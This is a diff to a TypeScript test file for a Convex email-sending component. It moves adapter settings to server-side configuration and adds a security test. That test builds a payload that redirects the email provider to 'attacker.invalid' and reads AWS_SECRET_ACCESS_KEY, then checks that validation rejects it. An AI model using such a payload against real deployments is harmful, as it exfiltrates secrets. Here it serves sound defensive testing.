@@ -1,8 +1,9 @@
 import { describe, expect, test } from "bun:test";
 import { componentsGeneric, defineSchema, httpRouter, makeFunctionReference } from "convex/server";
 import type { ApiFromModules } from "convex/server";
-import { convexTest } from "convex-test";
+import { convexTest, type TestConvex } from "convex-test";
 
+import { emailSender } from "../node/index.js";
 import { registerConvexEmail } from "../testing.js";
 import {
   ConvexEmail,
@@ -19,8 +20,6 @@ const message = {
   to: "ada@example.com",
   subject: "Welcome",
   text: "Your account is ready.",
-  adapters: [{ kind: "memory" as const }],
-  adapter: "memory",
 };
 
 const resendSecretBytes = new Uint8Array(32).fill(7);
@@ -39,7 +38,14 @@ function convexEmailComponent() {
   return component;
 }
 
-const email = new ConvexEmail(convexEmailComponent());
+/** The app's own sender action, as an app would export it from a `"use node"` file. */
+const sender = emailSender(convexEmailComponent());
+
+const email = new ConvexEmail(convexEmailComponent(), {
+  sender: makeFunctionReference<"action", { emailId: string }, null>("emailSender:send"),
+  adapters: [{ kind: "memory" }],
+  defaultAdapter: "memory",
+});
 
 const publicApi = email.exposeApi();
 
@@ -75,8 +81,14 @@ const app: AppApi = {
 const appModules = {
   "./app/_generated/api.ts": async () => ({}),
   "./app/emails.ts": async () => publicApi,
+  "./app/emailSender.ts": async () => ({ send: sender }),
   "./app/http.ts": async () => ({ default: router }),
 };
+
+async function flushScheduled(t: TestConvex<ReturnType<typeof defineSchema>>) {
+  await new Promise((resolve) => setTimeout(resolve, 0));
+  await t.finishAllScheduledFunctions(() => {});
+}
 
 function createTest() {
   const t = convexTest(defineSchema({}), appModules);
@@ -260,6 +272,51 @@ describe("ConvexEmail.exposeApi", () => {
 
     expect(status?._id).toBe(emailId);
     expect(status?.ownerId).toBe("user_123");
+  });
+
+  test("sends through the app's sender action and records the result in the component", async () => {
+    const t = createTest();
+    const asAda = t.withIdentity({ subject: "user_123" });
+
+    const emailId = await asAda.mutation(app.send, message);
+    await flushScheduled(t);
+
+    const status = await asAda.query(app.status, { emailId });
+    const events = await asAda.query(app.listEvents, { emailId });
+
+    expect(status).toMatchObject({ status: "sent", attemptedAdapters: ["memory"] });
+    expect(status?.providerMessageId).toEqual(expect.any(String));
+    expect(events.map((event) => event.type)).toEqual(["queued", "processing", "provider_attempt", "sent"]);
+  });
+
+  test("refuses caller-supplied adapter config, so public sends cannot exfiltrate deployment secrets", async () => {
+    const t = createTest();
+    const asAda = t.withIdentity({ subject: "user_123" });
+    const requests: string[] = [];
+    const nativeFetch = globalThis.fetch;
+
+    process.env.AWS_SECRET_ACCESS_KEY = "aws-secret-placeholder";
+    globalThis.fetch = async (input) => {
+      requests.push(String(input instanceof Request ? input.url : input));
+
+      return new Response(JSON.stringify({ id: "exfiltrated" }), { status: 200 });
+    };
+
+    const attack = {
+      ...message,
+      adapters: [{ kind: "resend" as const, apiKeyEnv: "AWS_SECRET_ACCESS_KEY", baseUrl: "https://attacker.invalid" }],
+      adapter: "resend",
+    };
+
+    try {
+      await expect(asAda.mutation(app.send, attack)).rejects.toThrow("Validator error");
+      await expect(asAda.mutation(app.sendBatch, { messages: [attack] })).rejects.toThrow("Validator error");
+      await flushScheduled(t);
+      expect(requests).toEqual([]);
+    } finally {
+      globalThis.fetch = nativeFetch;
+      delete process.env.AWS_SECRET_ACCESS_KEY;
+    }
   });
 
   test("queues public batches under one owner", async () => {
